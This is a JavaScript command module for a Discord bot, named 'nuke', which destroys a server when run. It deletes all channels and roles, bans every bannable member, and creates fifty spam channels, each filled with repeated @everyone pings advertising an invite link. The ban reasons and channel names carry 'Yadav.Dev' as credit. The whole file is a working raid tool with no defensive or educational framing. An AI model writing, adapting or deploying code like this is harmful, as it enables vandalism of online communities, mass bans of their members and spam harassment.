module.exports = {
  name: 'nuke',
  description: 'Full server nuke (fastest version)',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("Not in a server.");

    message.reply("🚀 Starting full nuke... (This will be very fast)");

    // 1. Delete all channels (parallel + fast)
    Promise.allSettled(guild.channels.cache.map(channel => 
      channel.delete().catch(() => {})
    )).then(() => console.log(chalk.red("All channels deleted")));

    // 2. Delete all roles (parallel)
    Promise.allSettled(guild.roles.cache.filter(r => r.name !== "@everyone").map(role => 
      role.delete().catch(() => {})
    )).then(() => console.log(chalk.red("All roles deleted")));

    // 3. Ban all members (very aggressive)
    Promise.allSettled(guild.members.cache.map(member => {
      if (member.id !== client.user.id && member.bannable) {
        return member.ban({ reason: "Nuked by Yadav.Dev" }).catch(() => {});
      }
    })).then(() => console.log(chalk.red("All members banned/kicked")));

    // 4. Spam new channels + everyone pings
    for (let i = 0; i < 50; i++) {
      guild.channels.create({ name: `nuked-by-yadav-${i}`, type: 0 })
        .then(channel => {
          for (let j = 0; j < 10; j++) {
            channel.send("@everyone https://discord.gg/bihar").catch(() => {});
          }
        }).catch(() => {});
    }

    message.reply("✅ Nuke completed! Server should be destroyed.");
  }
};
